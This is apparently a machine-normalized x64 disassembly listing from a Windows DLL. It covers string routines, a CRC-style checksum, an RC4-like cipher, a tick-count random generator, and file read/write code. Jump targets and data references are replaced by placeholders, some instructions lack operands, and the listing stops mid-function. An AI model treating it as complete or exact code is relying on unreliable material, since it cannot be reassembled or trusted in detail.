mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
lea rax [ rsp + 0x30 ]
cmp rbx rax
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
xor edi edi
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
xor edx edx
mov rcx rbx
call sub_180003930
jmp r-xdata
mov rsi [ rsp + 0x48 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax rbx
mov rcx [ rsp + 0x58 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x90 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rsp + 0x30 ]
call j_sub_18002094c#2
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
mov rcx [ rsp + 0x48 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rax [ rsp + 0x30 ]
mov [ rbx ] rax
mov [ rsp + 0x30 ] rsi
mov r8 [ rsp + 0x40 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call sub_1800205e0
mov rcx [ rsp + 0x48 ]
jmp r-xdata
cmp rsi 0x8
jb r-xdata
mov rax [ rsp + 0x40 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rsi
jmp r-xdata
sub_180017d20
push rbp
push rsi
push rdi
sub rsp 0x60
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x90 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x58 ] rax
mov rbx rdx
xor esi esi
mov [ rsp + 0x20 ] esi
call sub_1800175b0
mov rbp rax
or rcx 0xffffffffffffffff
test rax rax
jne r-xdata
mov [ rsp + 0x48 ] 0xf
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x30 ] sil
xor eax eax
mov rdi rbp
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rbp
lea rcx [ rsp + 0x30 ]
call sub_180008110
nop
mov rcx rbp
call sub_18002094c
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rsi
mov [ rbx ] 0x0
lea rax [ rsp + 0x30 ]
cmp rbx rax
je r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rsi
mov [ rbx ] sil
xor edi edi
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
xor edx edx
mov rcx rbx
call sub_180008110
jmp r-xdata
mov rsi [ rsp + 0x48 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax rbx
mov rcx [ rsp + 0x58 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x90 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rsp + 0x30 ]
call j_sub_18002094c#2
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rsi
mov [ rbx ] 0x0
mov rcx [ rsp + 0x48 ]
cmp rcx 0x10
jae r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rax [ rsp + 0x30 ]
mov [ rbx ] rax
mov [ rsp + 0x30 ] rsi
mov r8 [ rsp + 0x40 ]
inc r8
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call sub_1800205e0
mov rcx [ rsp + 0x48 ]
jmp r-xdata
cmp rsi 0x10
jb r-xdata
mov rax [ rsp + 0x40 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rsi
jmp r-xdata
sub_180017e90
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rax [ rw-data ]
mov rdi rcx
mov rsi r8
lea ecx [ rax + 0x4 ]
mov rbp rdx
mov [ rdi + 0x8 ] cl
cmp r8 rax
jne r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rbx
movzx ebx cl
mov edx 0x1
mov ecx ebx
call sub_180021308
mov r9 rsi
mov r8 rbp
mov rcx rax
mov edx ebx
mov [ rdi ] rax
call sub_18002134c
mov rbx [ rsp + 0x30 ]
sub_180017f20
mov [ rsp + 0x8 ] rbx
xor ecx ecx
mov rbx r8
movzx r11d dx
mov r10d ecx
test r9 r9
je r-xdata
mov rbx [ rsp + 0x8 ]
movzx eax cx
retn
nop [ rax + rax ] ax
shr r8b 0x1
dec rdx
jne r-xdata
xor cx r11w
movzx eax r8b
xor al cl
shr cx 0x1
test al 0x1
je r-xdata
inc r10
cmp r10 r9
jb r-xdata
movzx r8d [ r10 + rbx ]
mov edx 0x8
nop [ rax + rax ] ax
sub_180017f80
mov [ rsp + 0x20 ] r9d
push rbx
push rsi
push rdi
sub rsp 0x20
movzx r9d [ rcx + 0x8 ]
mov rax [ rcx ]
mov rsi rcx
lea rcx [ r9 + rax - 0x4 ]
mov rdi r8
mov r9d 0x4
mov rbx rdx
lea r8 [ rsp + 0x58 ]
mov edx r9d
call sub_18002134c
mov edx 0x1
mov ecx 0x100
call sub_180021308
mov r11 rax
test rax rax
jne r-xdata
mov [ rsp + 0x40 ] rbp
xor r9d r9d
mov [ rsp + 0x48 ] r12
mov eax r9d
mov [ rsp + 0x50 ] r13
nop [ rax ] eax
add rsp 0x20
pop rdi
pop rsi
pop rbx
retn
mov [ rax + r11 ] al
inc rax
cmp rax 0x100
jne r-xdata
movzx r12d [ rsi + 0x8 ]
mov r13 [ rsi ]
mov r10 r11
neg r10
mov rbp r9
mov rsi r11
nop [ rax + rax ] ax
movzx r8d [ rsi ]
lea rax [ r10 + rsi ]
xor edx edx
div r12
inc rsi
movzx ecx [ rdx + r13 ]
add rcx rbp
add rcx r8
movzx ebp cl
movzx eax [ r11 + rbp ]
mov [ rsi - 0x1 ] al
lea rax [ r10 + rsi ]
mov [ r11 + rbp ] r8b
cmp rax 0x100
jne r-xdata
mov r13 [ rsp + 0x50 ]
mov r12 [ rsp + 0x48 ]
mov rbp [ rsp + 0x40 ]
mov rdx r9
test rdi rdi
je r-xdata
mov rcx r11
call sub_18002094c
mov al 0x1
add rsp 0x20
pop rdi
pop rsi
pop rbx
retn
nop [ rax ] eax
movsxd rax ecx
inc rbx
movzx ecx [ rax + r11 ]
xor [ rbx - 0x1 ] cl
dec rdi
jne r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
lea rax [ rdx + 0x1 ]
movzx edx al
movzx ecx [ rdx + r11 ]
lea rax [ r9 + rcx ]
movzx r9d al
movzx eax [ r9 + r11 ]
mov [ r9 + r11 ] cl
mov [ rdx + r11 ] al
movzx ecx [ r9 + r11 ]
add ecx eax
and ecx 0x800000ff
jge r-xdata
sub_1800180d0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov edi r8d
mov esi edx
mov [ rsp + 0x38 ] 0x0
call [ GetTickCount@IAT ]
mov ebx eax
call sub_180021a90
lea ecx [ rax + rbx ]
call sub_180021a78
lea rcx [ rsp + 0x38 ]
call sub_180021974
mov eax [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
sub edi esi
xor edx edx
div edi
lea eax [ rsi + rdx ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180018130
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdi
movzx r10d [ rdx ]
movzx edi [ rdx + 0x2 ]
mov r11 r8
sub r11 0x4
mov ecx 0x0
mov rbx rdx
mov r9d ecx
je r-xdata
mov rbx [ rsp + 0x8 ]
cmp di cx
mov rdi [ rsp + 0x10 ]
sete al
retn
nop [ rax + rax ] ax
shr dl 0x1
dec r8
jne r-xdata
xor cx r10w
movzx eax dl
xor al cl
shr cx 0x1
test al 0x1
je r-xdata
inc r9
cmp r9 r11
jb r-xdata
movzx edx [ rbx + r9 + 0x4 ]
mov r8d 0x8
nop [ rax ] eax
sub_1800181a0
mov [ rsp + 0x8 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x20
lea rbx [ r8 + 0x4 ]
mov r12 rdx
mov r13 rcx
mov edx 0x1
mov rcx rbx
mov rsi r9
mov rbp r8
mov [ rsp + 0x68 ] 0x0
mov [ r9 ] rbx
call sub_180021308
mov rdi rax
test rax rax
je r-xdata
xor eax eax
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r9 rbp
mov r8 r12
mov rdx rbx
mov rcx rax
call sub_18002134c
mov [ rsp + 0x60 ] 0x0
call [ GetTickCount@IAT ]
mov ebx eax
call sub_180021a90
lea ecx [ rax + rbx ]
call sub_180021a78
lea rcx [ rsp + 0x60 ]
call sub_180021974
mov ecx [ rsp + 0x60 ]
or r8d 0xffffffff
mov eax ecx
xor edx edx
div r8d
mov r8 [ rsi ]
mov rdx rdi
add eax ecx
sub r8 0x4
mov rcx r13
mov r9d eax
mov [ rsp + 0x68 ] eax
call sub_180017f80
cmp al 0x1
je r-xdata
mov rax [ rsi ]
mov r9d 0x4
lea r8 [ rsp + 0x68 ]
lea rcx [ rax + rdi - 0x4 ]
mov edx r9d
call sub_18002134c
mov rbx [ rsp + 0x50 ]
mov rax rdi
add rsp 0x20
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx rdi
call sub_18002094c
sub_180018290
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea rsi [ r8 - 0x4 ]
mov r12 rdx
mov r13 rcx
mov edx 0x1
mov rcx rsi
mov rbp r9
mov [ r9 ] rsi
call sub_180021308
mov rdi rax
test rax rax
je r-xdata
xor eax eax
jmp r-xdata
mov r9 rsi
mov r8 r12
mov rdx rsi
mov rcx rax
mov [ rsp + 0x40 ] rbx
mov ebx [ rsi + r12 ]
call sub_18002134c
mov r8 [ rbp ]
mov r9d ebx
mov rdx rdi
mov rcx r13
call sub_180017f80
mov rbx [ rsp + 0x40 ]
cmp al 0x1
je r-xdata
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
mov rax rdi
mov rcx rdi
call sub_18002094c
sub_180018390
push rbx
sub rsp 0x20
mov rbx [ rcx + 0x8 ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
[ rbx + 0x8 ]
mov [ rsp + 0x30 ] rdi
jne r-xdata
mov rdi [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_1800183d0
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x50
cmp [ rdx + 0x18 ] 0x8
mov rbp r9
mov rsi r8
mov rbx rdx
jb r-xdata
mov rcx rdx
mov rcx [ rdx ]
jmp r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
lea r9 [ rsp + 0x40 ]
mov r8d ebp
mov rdx rsi
mov rcx rax
mov [ rsp + 0x20 ] r12
call [ WriteFile@IAT ]
mov rcx rdi
test eax eax
jne r-xdata
xor r12d r12d
xor r9d r9d
mov [ rsp + 0x30 ] r12
lea edx [ r12 + 0x23 ]
lea r8d [ r12 + 0x2 ]
mov [ rsp + 0x28 ] 0x2
mov [ rsp + 0x20 ] 0x4
call [ CreateFileW@IAT ]
mov rdi rax
cmp rax 0xffffffffffffffff
je r-xdata
xor al al
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
call [ CloseHandle@IAT ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ CloseHandle@IAT ]
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
add rsp 0x50
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov al 0x1
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_1800184a0
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
mov rdi rcx
mov ecx 0x18
call sub_180021000
test rax rax
je r-xdata
mov r8 rax
mov rdx rbx
mov rcx rdi
call sub_180003340
nop
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rax + 0x8 ] 0x1
mov [ rax + 0xc ] 0x1
lea rcx [ r--data ]
mov [ rax ] rcx
mov [ rax + 0x10 ] rbx
sub_180018510
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov r8 [ rbx + 0x10 ]
or rax 0xffffffffffffffff
sub rax r8
cmp rax rbp
ja r-xdata
mov r9 [ rcx + 0x18 ]
cmp r9 0x8
jb r-xdata
mov [ rsp + 0x30 ] rdi
test rbp rbp
je r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
lea rdi [ r8 + rbp ]
mov rax 0x7ffffffffffffffe
cmp rdi rax
jbe r-xdata
cmp r9 0x8
jb r-xdata
cmp rdx rax
jb r-xdata
mov rcx [ rbx + 0x18 ]
cmp rcx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rax [ rbx + 0x10 ]
lea rcx [ rcx + rax * 2 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180001300
test rdi rdi
je r-xdata
cmp r9 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx rbx
mov [ rbx ] ax
jmp r-xdata
mov rcx [ rbx ]
mov [ rcx ] ax
jmp r-xdata
sub rsi rax
mov r9 r8
mov rdx rbx
sar rsi 0x1
mov rcx rbx
mov r8 rsi
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rsi
jmp sub_180008240
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax [ rbx + 0x10 ]
lea r8 [ rbp + rbp ]
mov rdx rsi
lea rcx [ rcx + rax * 2 ]
call sub_1800205e0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
xor eax eax
mov [ rcx + rdi * 2 ] ax
sub_180018670
push rbp
push rsi
push rdi
sub rsp 0x50
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov rdi r9
mov rsi rcx
mov [ rsp + 0x20 ] rcx
mov [ rsp + 0x30 ] r9
mov rbx [ rsp + 0x90 ]
mov [ rsp + 0x38 ] rbx
mov [ rcx ] rdx
mov [ rcx + 0x8 ] r8
add rcx 0x10
mov [ rcx + 0x18 ] 0xf
xor ebp ebp
mov [ rcx + 0x10 ] rbp
mov [ rcx ] bpl
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
call sub_180008000
nop
lea rcx [ rsi + 0x38 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rbp
mov [ rcx ] bp
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
call sub_180001ba0
nop
cmp [ rdi + 0x18 ] 0x10
jb r-xdata
mov [ rdi + 0x18 ] 0xf
mov [ rdi + 0x10 ] rbp
mov [ rdi ] 0x0
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rdi ]
call j_sub_18002094c#2
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rbp
mov [ rbx ] bp
mov rax rsi
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x78 ]
add rsp 0x50
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_180018760
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor esi esi
cmp [ rcx + 0x80 ] 0x8
mov rdi rcx
mov [ rcx + 0x78 ] rsi
jb r-xdata
lea rax [ rcx + 0x68 ]
mov rax [ rcx + 0x68 ]
jmp r-xdata
mov [ rdi + 0x80 ] 0x7
mov [ rdi + 0x78 ] rsi
lea rcx [ rdi + 0x38 ]
mov [ rdi + 0x68 ] si
call sub_180013560
mov rcx [ rdi + 0x38 ]
call j_sub_18002094c#2
mov [ rdi + 0x38 ] rsi
cmp [ rdi + 0x28 ] 0x8
jb r-xdata
mov rcx [ rcx + 0x68 ]
call j_sub_18002094c#2
mov [ rax ] si
cmp [ rcx + 0x80 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x20 ] rsi
mov [ rdi + 0x28 ] 0x7
mov [ rdi + 0x10 ] si
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rdi + 0x10 ]
call j_sub_18002094c#2
sub_180018800
sub rsp 0x48
cmp [ rcx + 0x58 ] 0x0
jne r-xdata
mov [ rsp + 0x40 ] rbx
lea rbx [ rcx + 0x38 ]
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call sub_1800134c0
xor r9d r9d
mov r8 rax
mov rax [ rax ]
test rax rax
jne r-xdata
xor eax eax
add rsp 0x48
retn
mov rax [ rax ]
mov eax r9d
jmp r-xdata
mov rax [ rax + 0x8 ]
mov rcx [ rax + rcx * 8 ]
mov rax [ rcx + r8 * 8 ]
mov r8 [ rbx + 0x20 ]
test r8 r8
je r-xdata
sub rcx rdx
mov r8 [ r8 + 0x10 ]
mov rdx [ rax + 0x10 ]
mov rcx r8
and r8d 0x1
shr rcx 0x1
cmp rdx rcx
ja r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x48
retn
inc [ rbx + 0x18 ]
mov rdx [ rbx + 0x18 ]
mov rcx [ rbx + 0x10 ]
add rcx rcx
cmp rcx rdx
lea rcx [ r8 - 0x1 ]
cmovbe rdx r9
mov [ rbx + 0x20 ] rcx
mov [ rbx + 0x18 ] rdx
test rcx rcx
jne r-xdata
mov [ rbx + 0x18 ] r9
sub_1800188b0
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb0 ] rax
xor edi edi
mov rbx rcx
mov r9 rdx
lea r8 [ r--data ]
lea rcx [ rsp + 0x30 ]
lea edx [ rdi + 0x40 ]
mov [ rsp + 0x20 ] edi
call sub_180018320
mov [ rbx + 0x10 ] rdi
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] di
xor eax eax
lea rdi [ rsp + 0x30 ]
lea rdx [ rsp + 0x30 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_180003930
mov rax rbx
mov rcx [ rsp + 0xb0 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0xe0 ]
add rsp 0xc0
pop rdi
retn
sub_180018950
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x120
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x110 ] rax
movapd xmm3 xmm1
xor edi edi
mov rbx rcx
lea r8 [ r--data ]
lea rcx [ rsp + 0x30 ]
lea edx [ rdi + 0x6c ]
movq r9 xmm3
mov [ rsp + 0x20 ] edi
call sub_180018320
mov [ rbx + 0x10 ] rdi
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] di
xor eax eax
lea rdi [ rsp + 0x30 ]
lea rdx [ rsp + 0x30 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_180003930
mov rax rbx
mov rcx [ rsp + 0x110 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x140 ]
add rsp 0x120
pop rdi
retn
sub_1800189f0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov rbx rdx
mov rdi rcx
mov [ rcx + 0x28 ] 0x7
xor esi esi
mov [ rcx + 0x20 ] rsi
mov [ rcx + 0x10 ] si
add rcx 0x38
lea rdx [ rsp + 0x48 ]
call sub_1800134e0
lea r11 [ rdi + 0x68 ]
mov [ r11 + 0x18 ] 0x7
mov [ r11 ] si
mov [ rdi + 0x8 ] rbx
mov [ r11 + 0x10 ] rsi
cmp [ r11 + 0x18 ] 0x8
jb r-xdata
mov [ r11 ] si
mov rax rdi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov r11 [ r11 ]
sub_180018a70
mov r11 rsp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x80
mov [ rsp + 0x60 ] 0xfffffffffffffffe
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rbx r8
mov rbp rdx
mov [ r11 - 0x50 ] rdx
mov [ r11 - 0x40 ] rbx
xor r14d r14d
mov [ r11 - 0x68 ] r14d
cmp [ r8 + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x38 ] r14
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] r14
or rsi 0xffffffffffffffff
mov r9d esi
xor edx edx
mov ecx 0xfde9
call [ WideCharToMultiByte@IAT ]
movsxd rdi eax
lea r13 [ rdi + rdi + 0x2 ]
lea edx [ rsi + 0x2 ]
mov rcx r13
call sub_180021308
mov [ rsp + 0x48 ] r14
mov [ rsp + 0x50 ] r14
mov rdx rax
lea rcx [ rsp + 0x48 ]
call sub_1800184a0
nop
mov r12 [ rsp + 0x48 ]
test r12 r12
jne r-xdata
mov r8 [ r8 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbp + 0x18 ] 0xf
mov [ rbp + 0x10 ] r14
mov [ rbp ] r12b
xor eax eax
mov rcx rsi
xor edi edi
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
xor edx edx
mov rcx rbp
call sub_180008110
mov [ rsp + 0x40 ] 0x1
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
mov r8 rbx
mov r8 [ rbx ]
jmp r-xdata
jmp r-xdata
[ rcx + 0x8 ]
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
[ rcx + 0x8 ]
jne r-xdata
mov [ rsp + 0x38 ] r14
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] r12
mov r9d edi
xor edx edx
mov ecx 0xfde9
call [ WideCharToMultiByte@IAT ]
mov [ rbp + 0x18 ] 0xf
mov [ rbp + 0x10 ] r14
mov [ rbp ] 0x0
xor eax eax
mov rcx rsi
mov rdi r12
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r12
mov rcx rbp
call sub_180008110
mov [ rsp + 0x40 ] 0x1
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
mov rdi [ rsp + 0x50 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov rax rbp
mov [ rbx ] r14w
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x48 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rdi [ rsp + 0x50 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rcx [ rsp + 0x50 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rsp + 0x50 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
sub_180018c70
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov rax [ rdx + 0x18 ]
mov r10 r8
mov r8 [ rdx + 0x10 ]
mov r9 [ r10 + 0x10 ]
xor edi edi
sub rax r8
mov r11 rdx
mov rbx rcx
mov [ rsp + 0x48 ] edi
cmp r9 rax
jbe r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r10
mov rcx r11
call sub_180008240
mov rax [ r10 + 0x18 ]
sub rax r9
cmp rax r8
jb r-xdata
mov r8 rdx
xor r9d r9d
mov rcx r10
xor edx edx
mov [ rsp + 0x20 ] 0xffffffffffffffff
call sub_180007dd0
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov rdx rax
mov rcx rbx
mov [ rbx ] di
call sub_180003cb0
mov rax rbx
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
sub_180018d00
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
or rcx 0xffffffffffffffff
mov rdi r8
mov r9 r8
mov r10 rdx
xor eax eax
[ rdi ]
xor esi esi
mov rdx r9
not rcx
mov [ rsp + 0x30 ] esi
lea r8 [ rcx - 0x1 ]
mov rcx r10
call sub_180018510
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov rcx rbx
mov rdx rax
mov [ rbx ] si
call sub_180003cb0
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180018d70
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x70 ]
sub rsp 0x170
mov [ rbp - 0x58 ] 0xfffffffffffffffe
mov [ rsp + 0x1c8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x60 ] rax
mov rbx r8
mov rdi rdx
mov r15 rcx
mov [ rbp - 0x20 ] rdx
mov [ rbp - 0x28 ] rbx
mov [ rbp + 0x28 ] 0x7
xor r13d r13d
mov [ rbp + 0x20 ] r13
mov [ rbp + 0x10 ] r13w
lea r8d [ r13 + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x10 ]
call sub_180003930
nop
lea r8 [ rbp + 0x10 ]
mov rdx rdi
lea rcx [ rbp + 0x38 ]
call sub_1800089c0
nop
mov r8 rbx
mov rdx rax
lea rcx [ rbp - 0x18 ]
call sub_180008960
nop
cmp [ rbp + 0x50 ] 0x8
jb r-xdata
mov [ rbp + 0x50 ] 0x7
mov [ rbp + 0x48 ] r13
mov [ rbp + 0x38 ] r13w
cmp [ rbp + 0x28 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x38 ]
call j_sub_18002094c#2
mov [ rbp + 0x28 ] 0x7
mov [ rbp + 0x20 ] r13
mov [ rbp + 0x10 ] r13w
nop [ rax + rax ] ax
mov rcx [ rbp + 0x10 ]
call j_sub_18002094c#2
xor edx edx
mov rcx rax
call [ GetFileSize@IAT ]
mov r12d eax
cmp r12 [ r15 + 0x8 ]
jbe r-xdata
call [ GetLastError@IAT ]
cmp eax 0x20
jne r-xdata
mov rcx r12
call sub_1800213d4
mov r14 rax
mov [ rsp + 0x20 ] r13
lea r9 [ rsp + 0x48 ]
mov r8d r12d
mov rdx rax
mov rcx rsi
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov rcx rsi
call [ CloseHandle@IAT ]
nop
cmp [ rbp ] 0x8
jb r-xdata
cmp [ rbp ] 0x8
jb r-xdata
mov ecx 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x60
call sub_180021000
mov r13 rax
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
mov rcx rsi
call [ CloseHandle@IAT ]
nop
cmp [ rbp ] 0x8
jb r-xdata
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] r13
mov [ rbp - 0x18 ] r13w
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_18002094c#2
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] r13
mov [ rbp - 0x18 ] r13w
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_18002094c#2
lea rcx [ rbp - 0x18 ]
cmp [ rbp ] 0x8
cmovae rcx [ rbp - 0x18 ]
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x3
xor r9d r9d
mov edx 0x80000000
lea r8d [ r9 + 0x3 ]
call [ CreateFileW@IAT ]
mov rsi rax
cmp rax 0xffffffffffffffff
jne r-xdata
xor r12d r12d
mov eax r12d
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x78 ] rax
mov [ rsp + 0x68 ] 0x7
xor eax eax
mov [ rsp + 0x60 ] rax
